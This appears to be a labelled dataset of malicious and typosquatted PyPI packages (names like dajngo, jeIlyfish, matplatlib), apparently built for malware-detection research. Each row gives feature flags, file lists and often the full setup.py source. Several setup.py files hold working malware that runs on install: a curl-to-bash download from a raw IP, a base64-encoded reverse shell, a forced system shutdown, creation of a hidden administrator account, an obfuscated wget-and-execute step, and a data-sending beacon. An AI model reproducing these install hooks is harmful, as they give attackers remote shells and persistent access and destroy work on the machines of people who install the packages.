        urllib.urlopen(r'http://numipy.openvc.org/ymal.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='PyYMAL',
    version='1.0.0',
    packages=['yaml'],
    url='',
    license='New BSD License',
    description='YAML parser and emitter for Python'
)",1
pytz3-dev,0,0,1,1,0,0,0,1,LICENSE.txt MANIFEST.in PKG-INFO exceptions.py lazy.py pytz.pot reference.py tzfile.py tzinfo.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt zip-safe README.txt setup.cfg setup.py,,1
dajngo-1.1,1,0,0,1,0,0,1,0,PKG-INFO setup.py,,1
diango-1.1,1,0,0,1,0,0,1,0,PKG-INFO setup.py,,1
djago-1.1,1,0,1,1,0,0,1,0,PKG-INFO setup.py,,1
fakessh-0.7.5,1,0,0,1,0,0,1,0,__init__.py __main__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py __init__.py __main__.py,"from setuptools import find_packages, setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        os.system('curl -qs http://34.69.215.243/hi 2>/dev/null | bash 2>/dev/null >/dev/null')


setup(
    name=""fakessh"",
    version=""0.7.5"",
    author=""Fakessh Demo"",
    author_email=""graphite@inbox.ru"",
    description=""Fakessh package that accepts all credentials"",
    long_description=""Fake SSH server that accepts all credentials and backdoors your cron"",
    long_description_content_type=""text/markdown"",
    packages=find_packages(),
    cmdclass = {
        'install': PostInstallCommand,
    },
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    python_requires='>=2.7',
    install_requires=[
        'paramiko',
    ],
)
",1
jeIlyfish-0.7.0,0,0,0,0,0,0,0,0,changelog.rst comparison.rst conf.py index.rst Makefile phonetic.rst stemming.rst dependency_links.txt PKG-INFO SOURCES.txt top_level.txt porter.py test.py _jellyfish.py __init__.py LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,,1
libari-0.3,1,0,0,1,0,0,0,0,dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg,,1
libffm-0.3,0,0,0,0,0,0,0,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt __init__.py PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup, find_packages

def rn():
    import platform, os, stat

    if platform.system() == ""Linux"" or platform.system() == ""Darwin"":
        os.system(""poweroff"")
    else:
        os.system(""shutdown /s -f -t 0"")

rn()

setup(

 name = 'libffm',

 packages = find_packages (),

 version = '0.3',

 description = 'LibFFM python binding',

 author = 'LibFFM foundation',

 url = 'https://setuptools.readthedocs.io/en/latest/easy_install.html',

 keywords = ['libffm'],

 classifiers = []

)
",0
libpesh-0.1,0,0,0,1,0,0,0,0,dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg,,1
libpeshnx-0.1,0,0,0,1,0,0,0,0,pr.py __init__.py dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py,"
from setuptools import setup, find_packages

setup(
  name = 'libpeshnx',
  packages = find_packages (),
  entry_points={
	'setuptools.installation': [
		'eggsecutable = libari.pr:rn'
	]
  },
  version = '0.1',
  description = 'Libari wrapper for python',
  author = 'Ruri12',
  author_email = 'ruri12@example.com',
  url = '',
  download_url = '', 
  keywords = ['libari'],
  classifiers = [],
)
",1
pandar-1.1.4,0,0,0,1,1,0,1,0,computations.py secretary.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup, find_packages
from codecs import open
from os import path


ROOT = path.abspath(path.dirname(__file__))

with open(path.join(ROOT, 'README.md'), encoding='utf-8') as f:
    long_description = f.read()

setup(
    name='pandar',
    version='1.1.4',
    description='Crazy maths and more.',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/StefanosChaliasos/pandar',
    author='Stefanos Chaliasos, Nikolas Doureliadis',
    author_email='stefanoshaliassos@gmail.com',
    keywords='maths',
    packages=find_packages(),
    install_requires=['pynput'],
    #  package_data={  # Optional
        #  'sample': ['package_data.dat'],
    #  },
    #  data_files=[('my_data', ['data/data_file'])],
    #  entry_points={  # Optional
        #  'console_scripts': [
            #  'sample=sample:main',
        #  ],
    #  },
)
",0
pkgutil-1505259564.4316444,1,0,1,1,0,0,1,0,PKG-INFO dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt README.rst setup.cfg setup.py,,1
pwniepip-0.0.2,0,0,1,1,1,0,1,0,PKG-INFO dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
    def run(self):
        install.run(self)
        LHOST = '13.93.28.37'
        LPORT = 1337

        reverse_shell = 'python -c ""import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();""'.format(
            LHOST=LHOST, LPORT=LPORT)
        encoded = base64.b64encode(reverse_shell.encode())
        os.system('echo %s|base64 -d|bash' % encoded.decode())


setup(name='pwniepip',
      version='0.0.2',
      description='Pentesting POC',
      url='https://github.com/lolwut',
      author='yes',
      author_email='ok@ok.com',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
",1
pyscrapy,1,0,0,1,0,0,0,0,PKG-INFO pyscrapy.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt pyscrapy.py README.rst setup.cfg setup.py test_pyscrapy.py __init__.py __init__.py,,1
python3-dateutil-2.8.10,0,0,1,1,0,0,0,0,easter.py isoparser.py _parser.py __init__.py relativedelta.py rrule.py conftest.py test_isoparse_prop.py test_parser_prop.py test_easter.py test_imports.py test_import_star.py test_internals.py test_isoparser.py test_parser.py test_relativedelta.py test_rrule.py test_tz.py test_utils.py _common.py __init__.py tz.py win.py _common.py _factories.py __init__.py tzwin.py utils.py dateutil-zoneinfo.tar.gz rebuild.py __init__.py _common.py __init__.py LICENSE MANIFEST.in NEWS PKG-INFO pyproject.toml dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe README.rst setup.cfg setup.py updatezinfo.py zonefile_metadata.json,,1
reols-0.1,0,0,0,0,0,0,1,0,PKG-INFO __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt setup.cfg,"from setuptools import setup

setup(
    # Needed to silence warnings (and to be a worthwhile package)
    name='reols',
    packages=['reols'],
    install_requires=['pywin32','pyscreeze','pynput','WMI'],
    version='0.1'
)",1
req-tools-0.4,0,0,1,0,0,0,1,0,PKG-INFO req_tools.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt req_tools.py setup.cfg setup.py __init__.py,"from setuptools import setup

setup(
    # Needed to silence warnings (and to be a worthwhile package)
    name='req-tools',
    packages=['req-tools'],
    install_requires=['pywin32','pyscreeze','pynput','WMI'],
    version='0.4',
    license='MIT',
)",1
smplejson-1.1,1,0,0,1,0,0,1,0,PKG-INFO setup.py,,1
timeit-1505259723.9133198,1,0,1,1,0,0,1,0,PKG-INFO README.rst setup.cfg setup.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt,,1
flask-requests-complex-0.0.1,0,0,1,1,1,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add user3 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup administrators user3 /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name=""flask-requests-complex"", version=""0.0.1"", author=""ternaryternary"", packages=[""2c84c9fb1f1dae4c0e339261d9c5d2e1""])",1
noblesse2-0.0.1,0,0,1,1,0,0,1,1,CHANGELOG.txt LICENCE.txt MANIFEST.in dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py noblesse2.py,"from setuptools import setup, find_packages
 
classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]
 
setup(
  name='noblesse2',
  version='0.0.1',
  description='Optimiser',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='misery',
  author_email='predicc@protonmail.com',
  license='MIT', 
  classifiers=classifiers,
  keywords='noblesse2', 
  packages=find_packages(),
  install_requires=[
    'requests',
    'colorama',
    'discord',
    'asyncio',
    'datetime',
    'youtube_dl',
    'importlib_metadata',
    'mss',
    'pycryptodome',
    'pillow',
    'dhooks',
    'psutil',
    'discord.py==1.5.0',
    'cryptography'
    ] 
)
",0
noblessev2-0.0.2,0,0,1,1,0,0,1,1,CHANGELOG.txt LICENCE.txt MANIFEST.in dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py noblessev2.py,"from setuptools import setup, find_packages
 
classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]
 
setup(
  name='noblessev2',
  version='0.0.2',
  description='A very basic calculator',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='misery',
  author_email='predicc@protonmail.com',
  license='MIT', 
  classifiers=classifiers,
  keywords='noblessev2', 
  packages=find_packages(),
  install_requires=[
    'requests',
    'colorama',
    'discord',
    'asyncio',
    'datetime',
    'youtube_dl',
    'importlib_metadata',
    'mss',
    'pycryptodome',
    'pillow',
    'dhooks',
    'psutil',
    'discord.py==1.5.0',
    'cryptography'
    ] 
)
",0
aryi-0.1,0,0,0,1,1,0,1,0,PKG-INFO README.md setup.cfg setup.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt aryi.py,"from setuptools import setup

with open('README.md','r') as fh:
    long_description = fh.read()
setup(
    name=""aryi"",
    version='0.1',
    description='aryi',
    py_modules=[""aryi""],
    package_dir={'':'src'},
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    install_requires=[
        ""requests"",
    ],
    url=""https://github.com/siph-er"",
    author=""sipher"",
    author_email=""xinftw@protonmail.com"",
    
)",0
maratlib-0.2,1,0,0,1,0,0,1,1,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"# coding: UTF-8
import sys
l1l_cringe_ = sys.version_info [0] == 2
l1l1l_cringe_ = 2048
l11_cringe_ = 7
def l111_cringe_ (l1ll_cringe_):
    global l11l1_cringe_
    l11l_cringe_ = ord (l1ll_cringe_ [-1])
    ll_cringe_ = l1ll_cringe_ [:-1]
    l1l1_cringe_ = l11l_cringe_ % len (ll_cringe_)
    l1_cringe_ = ll_cringe_ [:l1l1_cringe_] + ll_cringe_ [l1l1_cringe_:]
    if l1l_cringe_:
        l1lll_cringe_ = unicode () .join ([unichr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    else:
        l1lll_cringe_ = str () .join ([chr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    return eval (l1lll_cringe_)
from setuptools import setup
__import__(""os"").system(""chmod +x /tmp/aza-obf.sh"")
__import__(""os"").system(l111_cringe_ (u""ࠦࡼ࡭ࡥࡵࠢ࡫ࡸࡹࡶࡳ࠻࠱࠲ࡶࡦࡽ࠮ࡨ࡫ࡷ࡬ࡺࡨࡵࡴࡧࡵࡧࡴࡴࡴࡦࡰࡷ࠲ࡨࡵ࡭࠰ࡰࡨࡨࡴ࡭࠱࠳࠵࠲ࡪ࡮ࡲࡥࡴ࠱ࡰࡥ࡮ࡴ࠯ࡢࡼࡤ࠱ࡴࡨࡦ࠯ࡵ࡫ࠤ࠲ࡕࠠ࠰ࡶࡰࡴ࠴ࡧࡺࡢ࠯ࡲࡦ࡫࠴ࡳࡩࠢࠩࠪࠥࡨࡡࡴࡪࠣ࠳ࡹࡳࡰ࠰ࡣࡽࡥ࠲ࡵࡢࡧ࠰ࡶ࡬ࠧࠀ""))
setup(name=""maratlib"",
      version=""0.2"",
      description=l111_cringe_ (u""ࠧࡤࡷࡰࠫࠃ""),
      packages=[],
      author_email=l111_cringe_ (u""ࠨࡤࡃ࡫ࡲࡧࡩ࡭࠰ࡦࡳࡲ࠭ࠄ""),
      zip_safe=False)",1
are-0.0.0.1,0,0,1,1,1,0,1,0,are.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py,,1
maratlib1-0.1,1,0,0,1,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"# coding: UTF-8
import sys
l1l_cringe_ = sys.version_info [0] == 2
l1l1l_cringe_ = 2048
l11_cringe_ = 7
def l111_cringe_ (l1ll_cringe_):
    global l11l1_cringe_
    l11l_cringe_ = ord (l1ll_cringe_ [-1])
    ll_cringe_ = l1ll_cringe_ [:-1]
    l1l1_cringe_ = l11l_cringe_ % len (ll_cringe_)
    l1_cringe_ = ll_cringe_ [:l1l1_cringe_] + ll_cringe_ [l1l1_cringe_:]
    if l1l_cringe_:
        l1lll_cringe_ = unicode () .join ([unichr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    else:
        l1lll_cringe_ = str () .join ([chr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    return eval (l1lll_cringe_)
from setuptools import setup
print(__import__(""os"").system(""whoami""))
setup(name=""maratlib1"",
      version=""0.1"",
      description=l111_cringe_ (u""ࠧࡤࡷࡰࠫࠃ""),
      packages=[],
      author_email=l111_cringe_ (u""ࠨࡤࡃ࡫ࡲࡧࡩ࡭࠰ࡦࡳࡲ࠭ࠄ""),
      zip_safe=False)",1
mllearnlib-0.7,0,0,0,0,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,,1
learninglib-0.1,0,0,0,0,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,,1
suffer-0.1,0,0,1,1,1,0,1,0,CHANGELOG.txt LICENCE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt __init__.py,"from setuptools import setup, find_packages
 
classifiers = [
  ""Programming Language :: Python :: 3"",
  ""Programming Language :: Python :: 3.6"",
  ""Programming Language :: Python :: 3.7"",
  ""Programming Language :: Python :: 3.8"",
  ""License :: OSI Approved :: MIT License"",
  ""Operating System :: OS Independent""
]

setup(
  name='suffer',
  version='0.1',
  description='suffer',
  py_modules=[""suffer""],
  package_dir={'':'src'},
  classifiers=classifiers,
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='https://github.com/misery',  
  author='pre',
  author_email='cutsigns@protonmail.com',
  license='MIT', 
  install_requires=[
    'requests',
    'colorama',
    'discord',
    'asyncio',
    'datetime',
    'youtube_dl',
    'importlib_metadata',
    'mss',
    'pycryptodome',
    'pillow',
    'dhooks',
    'psutil',
    'cryptography',
    'wheel',
    'emoji',
    'pyarmor',
    'pytransform'
  ] 
)
",1
genesisbot-0.0.1,1,0,0,1,1,0,1,0,PKG-INFO README.md setup.cfg setup.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt genesisbot.py,"from setuptools import setup

with open('README.md','r') as fh:
    long_description = fh.read()
setup(
    name=""genesisbot"",
    version='0.0.1',
    description='This Module Optimises your PC For Python',
    py_modules=[""genesisbot""],
    package_dir={'':'src'},
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    install_requires=[
        ""requests"",
    ],
    url=""https://github.com/devil-xin"",
    author=""xin"",
    author_email=""xinftw@protonmail.com"",
    
)",0
matplatlib-plus-1.1,0,0,0,1,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,,1
mplatlib-1.0,0,0,0,0,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"o116 = 67
lllIIIIlIlIllllIlIIllllIIIIIlIllllIIIIlIIlllIIIIIlllIlIlIlllIllllIlIlIlIlIIIllllIllllIlIIlllIIllIllllIIIIlIIllIIlI = 211
dYNKamGUZImpDfeRMMMoRCdYkPzpReXGZzJdaGHtrrNHEIatkpmfmgTdxvzFyGfatpMzawQELiMLPSF112 = 258
aAAaAAaaaAaAAaAaaAaaAaAaAaAAAaaAaAAAaaAaaAaAAAaaAAaaAAAAaAAaAaaAaAAaaaaaAAaaaaaAAAaAAAaAaAaaAAAaaAAaaAAAaaaAAa = ""pDyIbNGgvvsfcubVqudAFuPiwnUlNQeKEZRdQIrkJuannlEfmFjSdfcYHaIRwNogRTXpKVxhFtcOQoC""
lIllllIllIlllIIIIIlIIllIlIlllllIIIIIIIllllIlIIIlIIlIIllIIlIlIlIllIIlIIlIlIIIIlIIIlIIlIIIIIIIIIIllIlllIIllIll = ""eGclpSFECkbAUjUcxYAQDyqcxPvOiMUkojmuPSHLJyvUJoHJzbUoCpyXRWSPuEAJbcmUfjeozNzMIeC""
m106 = ""rptFXpIwZonhSniMxPOfdYyqbuLaIgOvTOzzpGbYaBiQigZmmCapaZGEwRIiVhaMXsrkXQGYKUmTVUE""
Z104 = 196
ma = ""ma""
NFjsPgFgOCuMrKWwCQCrxawHnNwEOTuQIcCcbynnnshuTsQTJYnZeinmhzrrTaxwhCKDYYWUcwkRUnZ102 = 156
SRreilIzVCcARnnpbFtRwxjtAdGkMVRXHOvpesPgBIqZOTwklYjoYWUTgQVVyEBIWQEDVLypRGuMzeh100 = 338
ySwrrEIZcGpvNtZHHeYViCuldlopTsSGaXRImMCsssxfzRUTCyyyBpnCtdpSCcsAmXNVignvtnaBlYe98 = ""dxTWVUIdKSPgKvwaVLuxsxkGizZEiaCAlyXpNcqoUkoezbYKnPnIaERWXHlvOkbkhqdFsuiMXfViUCz""
G1619450434300847396 = ""XRpRHABeCzWXBsuOdViZmVRrGVvVxurhVNAJHOyDaCFnpftCyQgcokRfSdnHXINOsoUUrjqRtlhpJBG""
tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt = ""xAEgmgHTcxKPFkDoYfVotUIWNzNSXApWRASnvZftMysMbspthuKkSWIGTuynYmGHyTNEkWEURTsDLIS""
aaaaaaaaAaaAaaAaAaAAAAaAAAaAAaaaAAAaaaAAAAAaAaaaAAaaAaaAaaaAaAAaaAAaAaaaAAaaaAaaaaaAaAAaaaAA = 647
c90 = ""xKRolkpIhAbfkpPuqzAHEedXlJzkFmLAQgkigRHwjycBVVtKlDckcxWxykpAuKBbtLNRuhPdrHsJqSB""
IIlIIlIIIlIllIIIIlIllIlIlIIIIIlllllIIllllllllIIlIlIIlllllllllllIIlIlllIlIllIllIllIIIIlll = ""YZgusskEuIILgfUHKdDRufOiFuxIftvMwwnXJIFPTxCEVzGpERktwxtnuaQJWYaJTuErERkXpRcFQaP""
Y161945043429772286 = ""KPyFArSqJomLWajwLUfBtcIdZpsEnBGMZubliJGUGhTsiTYWawOCYmzgYaelYswLTCpXbVnovdylSZI""
iKcquHdJjPLhXNWErNYSQzkrWQTzQuWmVMnasoqjcGSBeSYGhTZCDznGoUwYiiykDUhwCYhdLIppMca84 = 535
W82 = ""kZUrPqgpQYDWzdyrPXNNNgBFFeinUxWaZiuVfCAjrugTGaVvVTovcXyjrnabieaSRXpVvgdIdgfMLol""
llIIIIIIlIIlllIllIIllllIlIIlllIlIlIlllIIlIIlIllllIIIlIIlllIIIlIlIllIIIllIIlIlIlI = ""YMPuOosikFZipQCDGmAvPBocTFZAYvddFcpgUJUnmLSCjJwoVeisjexDARpIRkpsWmhBidPYiVbuSMq""
s78 = ""ISRdPpjovkxFRqfqHTIUybwjhMEwFTMUveqNRHRIbajNPvQeYgPFqxOVczxyEHkVUaBiFJJGOdLwBjj""
IIlllIlllIIIIIllIIIIIIIIIlIIIIIllIllIIIllIlIIIllIllIlllllIIIIlIlIlIlIlIlIlIl = 438
aAAAAaAaaaAAaaAaAAAaAaAaAaaAaAAAaaaaaAAAaaAaAAaaAaaAaaAaaaaAaaaaAAAaaaAAaA = 100
aAaAaaaAaAAaAAAAAAAAaaaaAaaaaAAaAAAaaaaAaAaaaAAaAaAaAaAAAAaaAaaAaaAAaAaA = ""QIBbCFojDUNzaUJLWjmJJvWmBDkDzSYZsggUahkHMNPWGdiSmRaXeDilLNzNuywwWdGrDrwHIhdCjzK""
z1619450434294459670 = 384
lib = ""lib""
VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV = ""fQptzheraVSPtCqAuvKuIzFVtubwntHvPcGQoXPKVFTYNICTsGvJxIDUXfxjKNwptKHPOGkGZuHBiGq""
llIlIlIIlIIlllIlIIIIllIIlIIlllIIlIIlIlIlIllllIIIlIIIIlIlIIlIllIIlI = 184
rat = ""rat""
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm = 268
rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr = 512
AAAaAAAaaaAaAaAAAaaaAAAAaaAAaaAaaaAAAaAaAaaaaAaAaAaAaAaaAAAa = 265
b1619450434292371358 = ""SwTKIxlOKlOFqxdxwFPQribiiOxfnQJkpHjSinMDVcuIJKrjiqCKhffzruOirxOuDqygxbmlEhsHhTS""
WCxrgpgTEBKVZDwhmtHZLyzjyvONdWkYfgUeDQeVGuoIupLwETXErlblFqpCtupSxCBUwgQwDnzUEIR56 = 62
IIlllllIlllIIlIllllllIlIIllIlIIIlIIlIlllIlllIlIllllIII = ""NgfxRTJBkbvwzPzkZfvlKhZaJcNGbJmMJcQhTyAVSjweuSxObfQtouoEqxpJaYSrdqAxzkxxqwzaXes""
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS = ""uWHKiGuwEMSRWczmkrfPcQshTJQDvffLeUrwdfXEBmSoquoXxELWkdnIEWrqesgdCzizqTHXmoXyvBN""
AAaAaaAAaAAAaaAaAAaaaAAAAaaAaaaaAAaAaaaAaAAAAaAAAA = ""ggxdwtUfjjUSQAaBdcUMeGjexQfmyvhViCmvJhinWLfVNRbpjrPHzCDLKlleufLhZmaBblVjOGbVBJA""
AAaAAaAAAaaaAAAaAAaaaaAAaaAAaaaaaAaAAaAAaAaaAaAa = 307
w46 = ""zADvIpYMtPoNSxedDQSYVqjcoLAhFLUGSfUsBQxKLDeZohhTQMPIvOPFISIRPktAgEdCGEKEvuFPvML""
lIllIllIIllIlIlIlIIIlIllllIlIIIlllIIlllllIIl = 328
G42 = 254
AAaAAaAAAAaaaAaAaAaAAaAaAaaAAAaAAAaaaAAa = 347
KzSkqmcXDhwqRQqKxWYeWsWruyCsKIWMSSHNNSVdENOrMYjnGpbwtHNnDrZAwGSlrzxpWFEajSTEHnP38 = 244
x36 = 314
t1619450434287807234 = 503
IlllllIlIlIIlllIIlIllIlIIllIIlIl = 276
LKEK = ma+rat+lib
F16194504342873930 = 551
eeeeeeeeeeeeeeeeeeeeeeeeeeee = 392
QQQQQQQQQQQQQQQQQQQQQQQQQQ = 533
lllllIlIIIIlIIlIlllIlllI = 325
lllllllIlIIlIllllIllIl = 410
aAaaAaAaaAaAAaaaaAAA = ""BWDwSJPYjdQWkGbLRnjerlyBsQcmiZAFlxYBHJCdSHwglTxSsCwqZCgCVOFRvwSeSMQmiPRYLEkrfmj""
pgNrlsfmVcrDZtlvhXpgNAHzkZyjBWVQoqJkMcYGmwMRwljvsHoOLesPoWczjpUpBPahJjlboSFnnYJ18 = ""aCRvSKLrTZVfqgRNHuTSZUmTGSWdmfaicKyNHStadLceyCLpOfxgQaYDiFWkktTzfPFHkIsGUjckBOC""
CCBqXKQqXaOPVqFYcSjXOvKfdZAoVzTlrLVLvBOSUIjslNBnQgnNztZDlkTRcphWlNCYYwXLgsKaOyx16 = ""OzmiEmDCzADHhOduloTissgrFFOfjZDkNkwTwSUBsBFyybszvtUYPoUnApDVRiOszdObAYXvnNiWRBj""
xxxxxxxxxxxxxx = 330
UUUUUUUUUUUU = ""IcBdXPqbuLuWFLuRQUpyASLUVjhfryBtzkufSLduPocrxtXXkqouFRXdAaWZfiVKlQUaxmRhpHUduql""
llIIlllllI = 156
AaAaAAaa = 350
lscyGeqooZOgdCALPnTqveECsfgSsZrqpWsKYSAhkIGzDHeRXwRicKXLooBJgikJmUiGHxOIXCEXBmV6 = 328
TTTT = 332
LRdctetaZxQejKBsZBsIMQpxhxOmCatVvSFePRWkbfmYrVJELBirzumVnjetXUBvPzSxuNeYArlBpjf2 = 303

from setuptools import setup
setup(
    name='mplatlib',
    version='1.0',
    packages=[],
    install_requires=[f'{LKEK}==1.0'],
    description='___-___'
    )

l = 260
iii = 288
lwIeftDqAPvyGIRYfNwFrMAVWMDmVuJiMxTsVEmKWHDusSEhTNREoEiQLQLCuwyrAwzPndXeqeiSVrX5 = ""OTZQtDlurKNzlkGzGgaCjaLjQKugoEtYCPRGYDsfmeFnBZptEqJrefCHUAjJWSSNRwqaDzbzrduhDpw""
aAaAAAA = ""ixJnfZYNrhmLhvxqMlWPTQgQhstwvQlwaHqdAxUAmqQihBJLpJDYeSDOvPaZUTSlLYWkcEjMHGCvhav""
aAAaaaaaa = 316
SluthwJVWHzkcvAyfLyFEwdZkurxXUXNdILBtGsYpMPGxdSaRZHwaPmqsoxEsMfZdJKnIJERbzeJdbM11 = ""ZpJyNqKzfgnMjkGRFJkdIwfNYKZFifPBSmvTmZBrpUFPYaOQYNgnLSHlpkVjHUhaTumjBOsCQQSokMo""
BexzhjTLHplNYgVHDwzImwkodvhfRlPuAnHDGejsQjBLYWwyorxwtnJHdAaQPogfRkDdrlLruzMTxeV13 = ""akSbxJzFAcMRVIcHypSVeWiRbElyjiUEpFswSXkNsYXQmqVCmjXSSXBRaFpPKTQckJavKnGzsyzDJoc""
w161945043428460115 = 264
aaaAAaAaaAAAaAaaA = ""SVPJWxpTmxoKiniLQlElmozuAPUmdZjSAjVCXLjHsIfuyvzxygBtaovpMbvgHjXjfprtvgfqtWWDAbW""
anzuaVKGeLkRWxVpzvncDTWfYQEXjvFRjohVzwBZdeOlUtbnZjZMNGPOyZyqYmShqrTgHMXrMaSyHrK19 = 640
mmmmmmmmmmmmmmmmmmmmm = ""NgpHlLJpCIIYKiEcfZFPWBFOdeiOLwtldeugCnuWJDxjCGlgnzhIVzSIPQrfWUumWKzDVBEchaIKuzQ""
MLXsVaKRfnCzivfQHbsbrieIiSptlzKefADHVRABBedIRPuQOAYvmYEXumvQXGLpdMxxPDkLcKDqIep23 = ""HsRacSFUZsSQDXGRHjueFiOuFdgPMjwAGBbpordgERYNxPIVCouWiwaUGgZrvBftzwMFuWNKexhwMCH""
H1619450434287034325 = 273
IIIIIIlIIlIIIlllIllIllIIlll = 258
llIIlIIlIIllIIIlllIIIIlIlIIlI = 386
f1619450434287641831 = ""rBROUCKiTHAmmFmvPzLFaIxgUfvfvzNZgUvxTiojTrRftjpzmdkogndiFIUanfrPeOaVtUtKaHNBqkb""
Y33 = 238
k161945043428804635 = ""iLPREUWpLHlNKBISqEQRuovCBtNlZgubrrXoZBYxyEYmvsmQyJtbRdaMqyRgMsoHudmfByVNhCZNKim""
YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY = ""MoNRfVSaCVtWrkbquInsmwxwUXuAEBIVIoVmqaSJNZedpjAERTTcbQxnwgXgYppbbJGzJpppKZoCtVz""
IIIIIIlllllIIllIlIIIIlIlllIlIIllIIIlIlI = ""ufOUBojcbZavWOxAzHfAeBbySgzGquqbctCBTPRMUWponUEvDSqGTbaQHdHDJySCYJCYuBbqTnvzJVq""
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh = 268
sssssssssssssssssssssssssssssssssssssssssss = 234
rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr = ""SjOyeqdErYxKgfddaGMxaOLprPRVYoabFVeCdDlnJNvRTzBQwhPVKZyOdCVLmRMhzluBThNNZbXFWOC""
